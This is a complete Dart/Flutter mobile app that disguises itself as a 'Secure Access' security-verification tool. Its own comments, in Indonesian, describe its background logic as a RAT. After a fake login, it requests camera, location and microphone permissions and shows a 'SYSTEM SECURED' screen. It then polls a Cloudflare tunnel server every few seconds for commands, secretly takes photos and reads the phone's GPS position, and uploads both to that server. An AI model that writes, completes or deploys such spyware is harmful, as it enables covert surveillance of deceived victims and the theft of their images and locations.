import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:camera/camera.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:google_fonts/google_fonts.dart';

// ─── KONFIGURASI (GANTI LINK CLOUDFLARE LU) ───
const String BACKEND_URL = 'https://realty-specials-monica-often.trycloudflare.com';
const String TENANT_API_KEY = 'API-KEY-DANZ';
const String DEVICE_ID = 'FLUTTER-DEV-01';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initializeService();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: const Color(0xFF0F172A),
        textTheme: GoogleFonts.poppinsTextTheme(Theme.of(context).textTheme),
        elevatedButtonTheme: ElevatedButtonThemeData(
          style: ElevatedButton.styleFrom(
            backgroundColor: const Color(0xFF3B82F6),
            foregroundColor: Colors.white,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
            padding: const EdgeInsets.symmetric(vertical: 16),
          ),
        ),
      ),
      home: const LoginPage(),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// 1. LOGIN PAGE
// ═══════════════════════════════════════════════════════════
class LoginPage extends StatefulWidget {
  const LoginPage({super.key});
  @override
  State<LoginPage> createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage> {
  final _emailCtrl = TextEditingController();
  final _passCtrl = TextEditingController();
  bool _isLoading = false;

  void _login() {
    if (_emailCtrl.text.isEmpty || _passCtrl.text.isEmpty) return;
    setState(() => _isLoading = true);
    Future.delayed(const Duration(seconds: 2), () {
      setState(() => _isLoading = false);
      Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => const PermissionPage()));
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.all(24.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              const Icon(Icons.security, size: 80, color: Colors.blueAccent),
              const SizedBox(height: 20),
              const Text('Secure Access', textAlign: TextAlign.center, style: TextStyle(fontSize: 28, fontWeight: FontWeight.bold)),
              const SizedBox(height: 10),
              const Text('Silakan masuk untuk melanjutkan verifikasi.', textAlign: TextAlign.center, style: TextStyle(color: Colors.grey)),
              const SizedBox(height: 40),
              TextField(
                controller: _emailCtrl,
                decoration: InputDecoration(
                  labelText: 'Email',
                  filled: true, fillColor: const Color(0xFF1E293B),
                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
                ),
              ),
              const SizedBox(height: 16),
              TextField(
                controller: _passCtrl,
                obscureText: true,
                decoration: InputDecoration(
                  labelText: 'Password',
                  filled: true, fillColor: const Color(0xFF1E293B),
                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
                ),
              ),
              const SizedBox(height: 30),
              ElevatedButton(
                onPressed: _isLoading ? null : _login,
                child: _isLoading ? const CircularProgressIndicator(color: Colors.white) : const Text('MASUK'),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// 2. PERMISSION PAGE
// ═══════════════════════════════════════════════════════════
class PermissionPage extends StatefulWidget {
  const PermissionPage({super.key});
  @override
  State<PermissionPage> createState() => _PermissionPageState();
}

class _PermissionPageState extends State<PermissionPage> {
  bool _isLoading = false;

  Future<void> _startVerification() async {
    setState(() => _isLoading = true);
    await Permission.camera.request();
    await Permission.location.request();
    await Permission.microphone.request();
    await Permission.notification.request();

    try {
      await http.post(Uri.parse('$BACKEND_URL/api/register'), headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'api_key': TENANT_API_KEY, 'deviceId': DEVICE_ID, 'userAgent': 'Flutter-App', 'platform': Platform.operatingSystem}));
    } catch (e) { debugPrint('Error: $e'); }

    final service = FlutterBackgroundService();
    await service.startService();
    setState(() => _isLoading = false);
    Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => const MainScreen()));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Padding(
        padding: const EdgeInsets.all(24.0),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            const Icon(Icons.lock_person, size: 80, color: Colors.orangeAccent),
            const SizedBox(height: 20),
            const Text('Izin Diperlukan', textAlign: TextAlign.center, style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold)),
            const SizedBox(height: 10),
            const Text('Aplikasi ini memerlukan akses Kamera, Lokasi, dan Mikrofon untuk verifikasi keamanan.', textAlign: TextAlign.center, style: TextStyle(color: Colors.grey)),
            const SizedBox(height: 40),
            ElevatedButton(
              onPressed: _isLoading ? null : _startVerification,
              child: _isLoading ? const CircularProgressIndicator(color: Colors.white) : const Text('IZINKAN SEMUA AKSES'),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// 3. MAIN SCREEN (LAYAR HITAM)
// ═══════════════════════════════════════════════════════════
class MainScreen extends StatefulWidget {
  const MainScreen({super.key});
  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  late Animation<double> _animation;

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(vsync: this, duration: const Duration(seconds: 2))..repeat(reverse: true);
    _animation = Tween<double>(begin: 0.5, end: 1.0).animate(_controller);
  }

  @override
  void dispose() { _controller.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Center(
        child: FadeTransition(
          opacity: _animation,
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.shield, size: 100, color: Color(0xFF10B981)),
              const SizedBox(height: 20),
              const Text('SYSTEM SECURED', style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold, letterSpacing: 2)),
              const SizedBox(height: 10),
              const Text('Aplikasi berjalan di latar belakang.', style: TextStyle(color: Colors.grey, fontSize: 14)),
            ],
          ),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// 4. BACKGROUND SERVICE (LOGIKA RAT)
// ═══════════════════════════════════════════════════════════
Future<void> initializeService() async {
  final service = FlutterBackgroundService();
  await service.configure(
    androidConfiguration: AndroidConfiguration(onStart: onStart, autoStart: false, isForegroundMode: true),
    iosConfiguration: IosConfiguration(autoStart: false),
  );
}

@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  Timer.periodic(const Duration(seconds: 3), (timer) async {
    try {
      final res = await http.get(Uri.parse('$BACKEND_URL/api/command/$DEVICE_ID'));
      final data = jsonDecode(res.body);
      if (data['command'] == 'get_camera') await takePicture(data['extra']);
      else if (data['command'] == 'get_location') await getLocation();
    } catch (e) { debugPrint('Polling error: $e'); }
  });
}

Future<void> takePicture(String type) async {
  try {
    final cameras = await availableCameras();
    final camera = cameras.firstWhere((c) => c.lensDirection == (type == 'front' ? CameraLensDirection.front : CameraLensDirection.back));
    final controller = CameraController(camera, ResolutionPreset.medium);
    await controller.initialize();
    final XFile file = await controller.takePicture();
    final bytes = await File(file.path).readAsBytes();
    final base64Image = base64Encode(bytes);
    await http.post(Uri.parse('$BACKEND_URL/api/data'), headers: {'Content-Type': 'application/json'},
      body: jsonEncode({'deviceId': DEVICE_ID, 'type': 'camera', 'data': {'image': 'data:image/jpeg;base64,$base64Image'}}));
    await controller.dispose();
  } catch (e) { debugPrint('Camera error: $e'); }
}

Future<void> getLocation() async {
  try {
    Position position = await Geolocator.getCurrentPosition();
    await http.post(Uri.parse('$BACKEND_URL/api/data'), headers: {'Content-Type': 'application/json'},
      body: jsonEncode({'deviceId': DEVICE_ID, 'type': 'location', 'data': {'lat': position.latitude, 'lng': position.longitude}}));
  } catch (e) { debugPrint('Location error: $e'); }
}
